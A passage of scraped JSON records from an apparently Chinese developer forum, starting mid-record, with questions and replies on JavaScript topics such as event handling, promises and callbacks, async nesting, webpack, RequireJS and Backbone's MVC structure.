"我感觉这边更主要的介绍triggerHandler 和 trigger 的不同，triggerHandler 不能冒泡，所以能实现container的事件隔离...", "see ", "\r", "see ", "\r", "see ", " "]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"http://www.html5rocks.com/en/tutorials/service-worker/introduction/\" rel=\"nofollow\">http://www.html5rocks.com/en/tutorials/service-worker/introduction/</a>\r<br>\r<br>一个新的可以用于管理页面缓存的 JS API。</div>"], "reply": "3", "tittle": "Service Worker", "comment": ["这里面提到了js的promises，相当有用", "是promise", "看看。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>&lt;html&gt;<br>\n    &lt;body&gt;<br>\n        &lt;div&gt;<br>\n            &lt;input type=\"text\" name=\"time\" id=\"time\" /&gt;<br>\n            &lt;input type=\"button\" value=\"开始\" onclick=\"startime()\" id=\"button\"/&gt;<br>\n        &lt;/div&gt;<br>\n        &lt;script type=\"text/javascript\"&gt;<br>\n            function startime(){<br>\n                console.debug(this);<br>\n            }<br>\n        &lt;/script&gt;<br>\n    &lt;/body&gt;<br>\n&lt;/html&gt;</p>\n\n<p>如何才能获取<br>\n&lt;input type=\"button\" value=\"开始\" onclick=\"startime()\" id=\"button\"/&gt;</p>\n\n<p>这个事件源?</p>\n</div></div>"], "reply": "7", "tittle": "javascript 如何获取触发函数的事件源?", "comment": ["HTML: <input type=\"button\" value=\"开始\" onclick=\"startTime(this)\" id=\"button\"/>\r", "JavaScript: function startTime(element) { console.log(element); }", "onclick=\"startTime(event)\"\r", "\r", "function startTime(event) \r", "\r", "一个event搞定一切", "现在了 压根不该这样写\r", "绑定事件应该用js来绑定 而不是写在html里面\r", "至少用 \r", "document.getElementById('button').onclick = function startime(e){\r", "console.debug(this, e);\r", "}\r", "\r", "一般来说最好用library比如jQuery或者类似\r", "$('#button').click(function startime(e){\r", "console.debug(this, e);\r", "});\r", "或者原生的\r", "document.getElementById('button').addEventListener('click', function startime(e){\r", "console.debug(this, e);\r", "}, false);", "要么使用监听函数。\r", "要么用call\r", "onclick = startTime.call(this, a,b,c)\r", "function starttime(a,b,c){}", "其实你在chrome控制台调试下，看下调用栈和各作用域变量就知道了", " 感谢,原来是我想错了~~", "难道不是 event.target?"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做单页应用，不用backbone等库，自己写个小框架的话<br>\n分形mvc过时了吗？</p>\n</div></div>", "<div class=\"topic_content\">简单的web单页应用啊。\r<br>没有说的更具体是因为我也没有针对哪个场景。\r<br>问题里说了自己搭的意思就是不需要密集交互，也不需要后台。\r<br>ps。抖机灵调侃的回答看得多了就觉得很烦，你们不觉得吗</div>"], "reply": "26", "tittle": "前端分形 mvc 过时了吗？", "comment": ["任何脱离应用场景就讲技术选择的都是耍流氓", "\"分形mvc\"是什么?我怎么google不到呢", " 就是说每个（功能）模块内部还有一套model（也可以叫做config data），dom method, even listener, 初始化等MVC结构。方便自由拆装。不知道现在还有没有更高明的轻量级框架概念，所以才问这个问题", "建议楼主提问时候描述精确详细一点, 不要造术语, 尽量带例子... 问得不仔细就不能怪别人回答不认真了.", " 书上说fmvc已经被用了十年了，我以为大家都懂", " 连google都不知道,你还能\"以为大家都懂\"? 不管是 分形mvc 还是 fmvc 都 google不到\r", "这是什么书啊...", "自己写的有把握比现在的轮子好吗？或者解决现在的轮子解决不了的问题？", " 哪本书有分形 MVC 的说法？backbone 甚至只能算个 MV 框架", "相比于抖机灵的回答，无意义空洞的提问更烦人。", " 我是不懂啊，所以才来问，怪我咯？", " 您脑洞开大了。我题目已经说了，是简易框架。而且我没有说backbone是mvc，我知道很多人觉得说backbone称为mvc是一种冒犯，但我没有这么说。", "Which book?", "Single Page Application 也会分场景的。 你说的简单的单页面应用， 数据交互多不多，视图更新的频繁不频繁，等等。 这就是应用场景。\r", "\r", "脱离应用场景谈 选择 backbone 还是其他类库或者框架 本来就不能一概而论。\r", "\r", "MVC只是手段 而非目的。 最终的是为了保证应用的可维护和可拓展性让逻辑更清晰。", " 很多人爱抖机灵或调侃别人，只是因为自己不懂，感到被冒犯，又恰好是个话痨。不懂可以不要回答啊，却跑过来针对我。技术板块欢迎这样灌水么？", "2333, BackBone 是 model-collection-view", "并不，有可能是这个问题宽泛地让人无从回答，只好吐槽以想题主获得更多交互和有用信息便于回答。", " ", " 是的，你这条回复说的是对的。当然了，我也希望多了解一些不同的框架概念。所以才来问。", " @", " Backbone 是一个比较标准的MVC框架\r", "只是Class命名上不是按照 MVC 来命名的\r", "\r", "Model 和 Collection 就是 Model （前者是一个或者是一堆而已）\r", "View 和 Router 实际上都是 Controller （我们在View里面绑定事件和处理时间和让Model+Template render出来 就是Controller干的事情了 Router 就不用说了）\r", "HTML template 或者说 DOM 才是 MVC 里面的 View\r", "\r", "由于 DOM 才是真正的渲染结果和交互事件来源 所以才是真正的 View\r", "但是一般后端 MVC 框架里面 view 目录一般都是放一些 jsp php 模板 所以说模板是 View 也 OK", " 主要它缺了一部分东西，就是 Model 和 DOM 的绑定，View 实现的是一个弱控制的玩意，不能双向绑定，甚至连单向绑定都比较残废，对子孙元素精细控制起来也很麻烦。\r", "\r", "而且 backbone 的倾入性很低，不像 angular 那样选了它其他只能按它的规则来，它可以和像 React 这样的组合起来玩，这大概是为什么一般称它为 MV* 框架的原因吧。", " \r", "backbone 所谓的mvc 的C 是Collection，集合不是控制器目的是不一样的。 backbone的 view层承担了部分Controller的职能， 所以并没有像传统意义上MVC做层次划分。 所以它不是严格意义上的mvc。", " 至于backbone的 单向数据绑定， 所以下个定论，backbone的 单向绑定一点都不残废，至于双向数据绑定就向它官网上说的，不需要双向绑定。\r", "\r", "react 也说了双向数据绑定在大型应用中容易出现混乱。  前端的概念就是这样，一直再“革命”", " angular 的双向绑定是可选的，它也能实现单向绑定，如果拿 backbone 的单向绑定和 angular 的比，那么它就是残废的。\r", "\r", "当然 backbone 也能实现完整的单向绑定，但要做的工作很多，几乎是帮 backbone 补坑，当然这不算坑，因为这就是 backbone 的设计思想，Jeremy 大神是个有代码洁癖的人。\r", "\r", "如果一个需求，是一个列表，列表有很多 rows，row 里面还有很多 items，那要实现精细的控制，这个工作就非常繁琐，要至少三个 View （list row item），要处理 collection 的 reset 和 add，要处理 model 的 change 和 delete，change 还要细分到 attribute 上，View 还要作手动的关联，数据量上来，你还不能 append，还得用 DocumentFragment 优化。\r", "\r", "这不是残废是什么？", "  MVC 并不需要M＋V的绑定\r", "只要 M＋Template->HTML／DOM 就可以了\r", "或者简单的单项绑定\r", "\r", "一般来说双向绑定的框架往往是MVVM\r", "\r", "至于MV＊框架 是 MVC MVP MVVM 等的总称而已", "  Backbone 本来就不该和 Angular 在这个方面比\r", "而且由于 Angular 是个 MVVM 框架\r", "双向或者单项绑定 并不是发生在View和Model之间 而是 View和View Model之间\r", "Model和View Model还是不一样的\r", "Data binding本来就很少在MVC框架里面支持 一般都是在MVP和MVVM的框架里面提供\r", "\r", "而且你看下传统的MVC框架 包括Java的还是全宇宙最好的PHP\r", "他们的模版也不是完全的和Model自动绑定 连单项绑定都不是\r", "\r", "所以 Backbone 完全符合MVC的\r", "只是由于它太Light weight 用起来肯定没有其他框架那么方便 只提供最基本的结构\r", "但是你可以整合很多很多的小library或者框架来让整框架变的方便"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>需求如下：</p>\n\n<p>想要做一个single page application, 也就是js那头要有类似mvc至少得要有多个view。然后又想能写可重用的html控件或者widget，类似很多存在的jquery控件（比如，日历控件），不过不想在js里面拼html（ReactJS那种除外）. </p>\n\n<p>我尝试过angularjs, 发现他写一个widget太难了，如果做成一个view不好reuse（一个页面弄两个啥的），如果做成directive太复杂了……什么compile link阶段实在不想用。……</p>\n\n<p>所以除了angularjs, 有啥好的推荐吗？</p>\n</div></div>"], "reply": "7", "tittle": "求好的 client JS 框架推荐", "comment": ["Polymer 你值得拥有", "你的需求 polymer 全部满足", "meteor", " 多谢我去研究一下。", "不排斥 JSX 那就直接用 React 吧. 目前也就 React, Ember, Angular, Polymer 可以选.", "IE gte 9 用Vue，要支持IE8用 Ractive \r", "很好用，这两个也很像", "借地问一下，Polymer 现在的浏览器兼容性如何？这个貌似网上只有 0.5 版本的资料，虽然我不指望 1.0 在这方面有多大改进..."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是给公司里同事做技术分享时准备的AngularJS的材料，非常简易的入门，对AngularJS最最基本的概念和使用方法做了一个介绍，第一步的代码都可以通过git checkou不同的标签来查看。服务器运行需要node，npm install相关依赖然后使用bin/www文件启动。<br>\n<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/hbthlw/AngularJS-simple-introduction\">https://github.com/hbthlw/AngularJS-simple-introduction</a></p>\n</div></div>"], "reply": "3", "tittle": "AngularJS 超简易入门，附每步示例代码", "comment": ["然而一条回复都没有，", "不看也支持下！", "哪个版本，1的时候还没学，2就来了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不太会表达。我还是直接贴代码<br>\n```javascript<br>\nvar results = \"\";</p>\n\n<p>request({<br>\n    method: \"GET\"<br>\n    url: \"<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.xxx.com\">www.xxx.com</a>\"<br>\n}, function (data) {<br>\n    results = data;<br>\n});</p>\n\n<p>console.log(results) // 这里因为回调的原因总是空的。<br>\n```<br>\n有什么方法保证回调之后数据能同步...</p>\n</div></div>"], "reply": "13", "tittle": "在 js 中使用回调如何保证数据的同步获得。", "comment": ["sync or promise", "最暴力的方法 async:false", "var XmlHttp;\r", "XmlHttp = new ActiveXObject(\"Msxml2.XMLHTTP.3.0\");\r", "\r", "function send() {\r", "   XmlHttp.onreadystatechange = doHttpReadyStateChange;\r", "   XmlHttp.open(\"GET\", \"http://localhost/sample.xml\", true);\r", "   XmlHttp.send();\r", "}\r", "\r", "function doHttpReadyStateChange() {\r", "   if (XmlHttp.readyState == 4) {\r", "      alert(\"Done\");\r", "   }\r", "}\r", " \r", "楼主，当 XmlHttp.readyState 的值为4的时候，数据才会返回。你直接调用有可能数据还没返回。", "把后续代码写在ajax的success的callback里面啊，就不会有问题了。", "1 改成同步\r", "2 把console.log放到callback里面", "console.log(results) 应该放在这里：\r", "\r", "}, function (data) {\r", "results = data;\r", "****console.log(results);\r", "});", "Promise", "你都说了是“回调”了，人家还没回，你就调了", " +1 呵呵", "但凡异步的都必须在回调里做操作", "本来是在写爬虫遇到的问题，大致抽象了出来，我全用async解决了，感谢以上各位的回复🙏。", "ES 6 的 generator ，局部的同步代码", " 哈哈"]},
{"content": ["<div class=\"topic_content\">用ACE写了个编辑器，想添加文档目录，有什么可以直接和ACE集成的吗？</div>"], "reply": "目前尚无回", "tittle": "ACE 在线 IDE 编辑器，有什么文档目录插件？", "comment": []},
{"content": ["<div class=\"topic_content\">暂时只知道requirejs</div>"], "reply": "目前尚无回", "tittle": "js 中 amd 有哪些实现方案呢？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><div class=\"highlight\"><pre><span class=\"nx\">itemCount</span> <span class=\"o\">++</span><span class=\"p\">;</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">itemCount</span> <span class=\"o\">===</span> <span class=\"nx\">items</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nx\">pageCount</span> <span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">pageCount</span> <span class=\"o\">===</span> <span class=\"nx\">pages</span><span class=\"p\">)</span> <span class=\"nx\">cb</span><span class=\"p\">(</span><span class=\"kc\">null</span><span class=\"p\">);</span>\n\n    <span class=\"nx\">async</span><span class=\"p\">.</span><span class=\"nx\">eachSeries</span><span class=\"p\">(</span><span class=\"nx\">webSites</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">site</span><span class=\"p\">,</span> <span class=\"nx\">cb___</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">fs</span><span class=\"p\">.</span><span class=\"nx\">appendFile</span><span class=\"p\">(</span><span class=\"nx\">filepath</span><span class=\"p\">,</span> <span class=\"nx\">site</span><span class=\"p\">,</span> <span class=\"kd\">function</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">error</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">);</span>\n        <span class=\"p\">});</span>\n        <span class=\"nx\">cb___</span><span class=\"p\">();</span>\n    <span class=\"p\">});</span>\n\n    <span class=\"nx\">cb_</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n\n<span class=\"nx\">cb__</span><span class=\"p\">();</span>\n</pre></div>\n\n<p>我写的爬虫，在爬了一个page的所有item之后，还要深入到每个item里面取数据，取完之后写到文件里去，然后再爬下一个页面。</p>\n\n<p>我使用了多层嵌套async.eachSeries之后发现，我只会在最深层级的回调中获取外层（套了很多层）的回调次数然后判断是不是继续下一步，所以写了很多的计数器。</p>\n\n<p>有没有更好的解决方法呢？</p>\n</div></div>"], "reply": "8", "tittle": "Nodejs 使用 Async 库多层嵌套之后产生的问题", "comment": ["1. eachSeries有第三个参数。\r", "2. 计数器是没有必要的，可以再加一层嵌套\r", "```\r", "    var pageArr = [];\r", "    for(var i=1;i<=pageCount;i++){\r", "        pageArr.push(i)\r", "    }\r", "    async.eachLimit(pageArr...\r", "\r", "```", "你需要的只是一个 EventEmitter", "你需要的是使用 ES7 的 async 和 await。", " 标题大大的使用Async库...", " eachLimit解决了我的问题，thx 。", "你需要的是ES7 的async await，然而没卵用，目前没哪个js engine支持~\r", "但是可以曲线救国，Generator + Promise，yield Promise = await Task\r", "\r", "甩一个示例 ", "你真的需要promise", " 哈哈，看回答，浮躁的JS圈"]},
{"content": ["<div class=\"topic_content\">有许多尺寸各异的png图片，需要在一个固定尺寸的div内通过一个img(id=\"pic\")显示。\r<br>图片之间通过函数切换，输入参数通过文本框获取。\r<br>\r<br>function display(id){\r<br>document.getElementById(\"pic\").src=id+\".png\"\r<br>}\r<br>\r<br>第一个图片能按原尺寸显示，再切换之后的图片的尺寸则变成与第一个相同了。\r<br>注意到CSS样式里出现了!important后缀，我尝试在display函数内尝试重设pic尺寸，但是不管用。</div>", "<div class=\"topic_content\">已自行解决。捣鼓了3小时</div>"], "reply": "3", "tittle": "求准确地显示图片的方法", "comment": ["还行吧", "不知道你的 CSS 怎么写。\r", "但是，应该是这样的。\r", "\r", "src=id+\".png\"+\"?\"+id；（防缓存）\r", "\r", "CSS:\r", "width: 固定值px;\r", "height: auto;", " 这样写不行呢……\r", "我最后用setAttribute('style','width:auto !important;height:auto !important;)以及一段获取原文件尺寸的js搞定的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://wbus.its-iot.com/wei-bus-app/route?nickName=&amp;openId=ouz9Ms6NtWbUFHhxZj12JumuWh-M&amp;gzhUser=gh_342e92a92760\">http://wbus.its-iot.com/wei-bus-app/route?nickName=&amp;openId=ouz9Ms6NtWbUFHhxZj12JumuWh-M&amp;gzhUser=gh_342e92a92760</a></p>\n<div class=\"highlight\"><pre><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getUrlParam</span><span class=\"p\">(</span><span class=\"s2\">\"openId\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">openId</span> <span class=\"o\">=</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getUrlParam</span><span class=\"p\">(</span><span class=\"s2\">\"openId\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">openId</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getCookie</span><span class=\"p\">(</span><span class=\"s2\">\"openId\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">openId</span> <span class=\"o\">=</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getCookie</span><span class=\"p\">(</span><span class=\"s2\">\"openId\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getUrlParam</span><span class=\"p\">(</span><span class=\"s2\">\"gzhUser\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">gzhUser</span> <span class=\"o\">=</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getUrlParam</span><span class=\"p\">(</span><span class=\"s2\">\"gzhUser\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">gzhUser</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span> <span class=\"o\">&amp;&amp;</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getCookie</span><span class=\"p\">(</span><span class=\"s2\">\"gzhUser\"</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">gzhUser</span> <span class=\"o\">=</span> <span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getCookie</span><span class=\"p\">(</span><span class=\"s2\">\"gzhUser\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"o\">!</span><span class=\"nx\">common</span><span class=\"p\">.</span><span class=\"nx\">getModuleRole</span><span class=\"p\">(</span><span class=\"s2\">\"非微信浏览\"</span><span class=\"p\">,</span> <span class=\"nx\">sessionStorage</span><span class=\"p\">.</span><span class=\"nx\">openId</span><span class=\"p\">))</span> <span class=\"p\">{</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">ua</span> <span class=\"o\">=</span> <span class=\"nx\">navigator</span><span class=\"p\">.</span><span class=\"nx\">userAgent</span><span class=\"p\">.</span><span class=\"nx\">toLowerCase</span><span class=\"p\">();</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nx\">ua</span><span class=\"p\">.</span><span class=\"nx\">match</span><span class=\"p\">(</span><span class=\"sr\">/MicroMessenger/i</span><span class=\"p\">)</span> <span class=\"o\">!=</span> <span class=\"s2\">\"micromessenger\"</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">location</span><span class=\"p\">.</span><span class=\"nx\">href</span> <span class=\"o\">=</span> <span class=\"s2\">\"browserError\"</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n</pre></div>\n\n<p>我看了下源代码，这货要判断URL传入的两个ID以及浏览器UA，但是我把UA伪装成微信（Mozilla/5.0 (<code>iPhone; CPU iPhone OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10B329 MicroMessenger/5.0.1</code>）且带上UrlParam以后还是被跳转到browserError</p>\n</div></div>"], "reply": "10", "tittle": "一个便民应用限制得如此丧心病狂我也是醉了...", "comment": [" 这个链接有些名字机器 openid，debug 用的？可以发掘一下。", "楼上好评", "\r", "\r", "\r", "\r", " \r", "\r", "1/0 区分正反方向", "微信有没有写入什么cookie呢？", "既然用上了 openid 就只能关注才能访问了。若是不通过接口动态获取 openid 的话像 2 楼那样搞一个就行了。", " 这个可以，只是这主打“便捷生活，轻松出行”的行讯通有没必要搞得如此丧心病狂...", "武汉就做的很好 完全没有任何限制\r", "甚是奇葩", "但是武汉的这个网页版，完全不知道怎么用呢？线路是个什么鬼？"]},
{"content": ["<div class=\"topic_content\">在HTML文件中如果有\r<br>```html\r<br>&lt;script src=\"./src/js/A.js\"&gt;&lt;/script&gt;\r<br>&lt;script src=\"./src/js/B.js\"&gt;&lt;/script&gt;\r<br>```\r<br>wepack之后，A，B的源码合并并压缩为bundle.js\r<br>有什么方法可以改为\r<br>```html\r<br>&lt;script src=\"./build/js/bundle.js\"&gt;&lt;/script&gt;\r<br>```</div>"], "reply": "11", "tittle": "Webpack 怎么改 html 中的 js 路径？", "comment": ["开发阶段用webpack-dev-server实时打包 就不用改来改去了...", "可以自己写个webpack插件 自动替换", " 不太懂什么意思，\r", "业余前端，已经被js这些项目管理工具搞得有点晕了\r", "用webpack-dev-server这些路径就不需要手工管理了吗，还是说\r", "一开始就指定好bundle.js路径，其余按commonjs的风格require进来就好了", "一开始就是 bundle.js", "一般这些工具都带watch模式，源文件更改自动重新编译", "直接用bundle.js\r", "在webpack配置的devtool中加一个sourcemap来调试", " @", " 请教一下\r", "你好，目前使用react＋flux\r", "我不想好多组件都写一句require ‘react’，所以上面那个A是react.js，B是一个main.js\r", "如果直接用bundle，是不是webpack自己就能处理好，不会多次将A require进来吗？\r", "\r", "另外请问前端开发中有没有约定俗成的目录结构？webpack对于开发和生产环境一般是怎么配置的？", " ", "\r", "不知道这个是不是你想要的>.<", " \r", "楼上用的commonsChunk是一个方式\r", "也可以使用webpack配置中的externals\r", "\r", "更多的可以参考一下repo ", "     jsx 和 require（‘xxx’）  的代码必须一起打包成bundle.js吗，  打包以后的bundle.js差不多接近2m了  我想 require('xxx') 和actions store打包成bundle.js     jsx的component在页面用script引用 \r", "\r", "比如<script src=\"bundle.js\" ></script>\r", "<script type='text/jsx' >\r", " \r", "  ...\r", "    componentDidMount: function() {\r", "        NodeStore.addChangeListener(this.onChange);\r", "    },\r", "\r", "...\r", "</script> \r", " 但是提示  NodeStore 找不到", "``` \r", "<script src=\"./src/js/A.js\"></script> \r", "<script src=\"./src/js/B.js\"></script> \r", "```\r", "\r", "这种情况，使用 [coolie](http://coolie.ydr.me/) 非常容易实现。\r", "\r", "\r", "``` \r", "<!--coolie-->\r", "<script src=\"./src/js/A.js\"></script> \r", "<script src=\"./src/js/B.js\"></script> \r", "<!--/coolie-->\r", "```\r", "\r", "使用\r", "```\r", "coolie build \r", "```\r", "构建之后\r", "\r", "=>\r", "\r", " ``` \r", "<script src=\"/abcdef123456.js\"></script> \r", "```"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><strong>目標</strong>: 將已經存在的Requirejs轉換成Webpack</p>\n\n<p>比如類似<a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/thlorenz/browserify-ftw\">browserify-ftw</a>的, 可以自動轉換 <code>Requirejs</code>成 <code>Browserify</code></p>\n\n<p>如果有用過類似的library可以將<code>RequireJS</code>轉換成<code>Webpack</code> 的麻煩告訴下, 謝謝.</p>\n</div></div>"], "reply": "8", "tittle": "尋找關於 Requirejs 轉換 Webpack 的幫助", "comment": ["webpack应该是支持requirejs的", "？为什么需要转换？", "webpack很火啊，貌似还没有中文社区", "webpack 支持 AMD ", "如果用了r.js打包的话 path转换一下就好了\r", "requirejs的插件可能也会遇到问题", " \r", " \r", " \r", " \r", "\r", "多謝各位\r", "\r", "\r", " 因為目前來說只有Webpack是Module來pack的, 其他的都是用File來pack的\r", "你可以看看這個視頻 Pete Hunt將 Instagram 怎麼pack.\r", "目前在一个后台新小项目中使用webpack，有人开始使用了没？", "刚用 requireJS 。。。不是我不明白啊，这世界变化快"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>比如，</p>\n<div class=\"highlight\"><pre><span class=\"nx\">Q</span> <span class=\"s\">\"Hello world\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str)-&gt;</span>\n    <span class=\"s\">\"hello 2\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str2)-&gt;</span>\n    <span class=\"c1\"># str 怎么获取？</span>\n</pre></div>\n\n<p>备选方案 1：闭包法</p>\n<div class=\"highlight\"><pre><span class=\"nx\">Q</span> <span class=\"s\">\"hello world\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str)-&gt;</span>\n    <span class=\"nx\">Q</span> <span class=\"s\">\"hello 2\"</span>\n    <span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str2)-&gt;</span>\n        <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span> <span class=\"nx\">str</span><span class=\"p\">,</span> <span class=\"nx\">str2</span>\n</pre></div>\n\n<p>缺点：不好看，陷入了 callback hell。</p>\n\n<p>备选方案 2：外部变量法</p>\n<div class=\"highlight\"><pre><span class=\"nv\">str = </span><span class=\"kc\">null</span>\n<span class=\"nx\">Q</span> <span class=\"s\">\"hello world\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(s)-&gt;</span>\n    <span class=\"nv\">s = </span><span class=\"nx\">str</span>\n    <span class=\"s\">\"hello 2\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str2)-&gt;</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span> <span class=\"nx\">str</span><span class=\"p\">,</span> <span class=\"nx\">str2</span>\n</pre></div>\n\n<p>缺点：用跨越作用域的变量，显得不太干净</p>\n\n<p>备选方案 3：返回数组法</p>\n<div class=\"highlight\"><pre><span class=\"nx\">Q</span> <span class=\"s\">\"hello world\"</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(str)-&gt;</span>\n    <span class=\"p\">[</span><span class=\"nx\">str</span><span class=\"p\">,</span> <span class=\"s\">\"hello 2\"</span><span class=\"p\">]</span>\n<span class=\"p\">.</span><span class=\"nx\">then</span> <span class=\"nf\">(s)-&gt;</span>\n    <span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nx\">log</span> <span class=\"nx\">s</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">],</span> <span class=\"nx\">s</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n</pre></div>\n\n<p>缺点：返回值意义不明朗；要向下传递多层的时候麻烦。</p>\n\n<p>所以大家遇到这种问题的时候怎么办？</p>\n</div></div>"], "reply": "12", "tittle": "Promise 里要用到上一个执行过程里的变量怎么办？", "comment": ["我自己用的第一种。。", "我知道用 bluebird 可以 bind 到 this 上 \r", "\r", ".bind() also has a useful side purpose - promise handlers don't need to share a function to use shared state:\r", "\r", "somethingAsync().bind({})\r", ".spread(function (aValue, bValue) {\r", "    this.aValue = aValue;\r", "    this.bValue = bValue;\r", "    return somethingElseAsync(aValue, bValue);\r", "})\r", ".then(function (cValue) {\r", "    return this.aValue + this.bValue + cValue;\r", "});", "理论上方案三最好。如果数组意义不明确，那么就用 object。实践上方案一写起来方便，但是变量太多的话效果与全局变量类似。", "`spread` 返回多个值，是最方便的", "用方案三，但用object。如果能用 ES6，配合 ES6 的 object literal shorthand\r", "\r", "Promise.resolve(\"hello world\")\r", "  .then(str => ({str1: str, str2: \"hello 2\"}))\r", "  .then(({str1, str2}) => console.log(str1, str2))", " 这个是最好的办法。", "首先比较推荐使用 bluebird，API 比较丰富，性能也比较高，比 io.js 原生实现的都快。\r", "\r", "如果几个执行过程是相互独立的，只是最终的返回的结果需要用到所有过程的结果，那就用 .spread\r", "\r", "Promise.delay(500).then(function() {\r", "   return [fs.readFileAsync(\"file1.txt\"),\r", "           fs.readFileAsync(\"file2.txt\")] ;\r", "}).spread(function(file1text, file2text) {\r", "    if (file1text !== file2text) {\r", "        console.log(\"files are equal\");\r", "    }\r", "    else {\r", "        console.log(\"files are not equal\");\r", "    }\r", "});\r", "\r", "如果后面的过程依赖前面过程的结果，就用第三种，传递的时候用 Object。", "这是啥语言？", " CoffeeScript", " @", " @", " 谢谢你们，我觉得我心目中最好的方法大概就是 `spread` 这个 api。\r", "至于 bluebrid 和 Q 嘛……一开始接触到的就是 Q 就一直用了，不过我倒是觉得 Q 的 api 比 bluebird 的好用一些……\r", "\r", " coffee 里没有这么好用的语法…… coffee 作者似乎对 ES6 比较抵触。\r", "\r", " 是 coffeescript。", " \r", " 第一种太难看了啊……\r", "本来用 promise 就是为了避免这种一大堆的嵌套回调……", "我会选第三种，这种情况下数组其实是一个Tuple，从这个角度理解就是一个非常正常的数据结构了\r", "其实更多的我会在第三种的基础上返回对象"]},
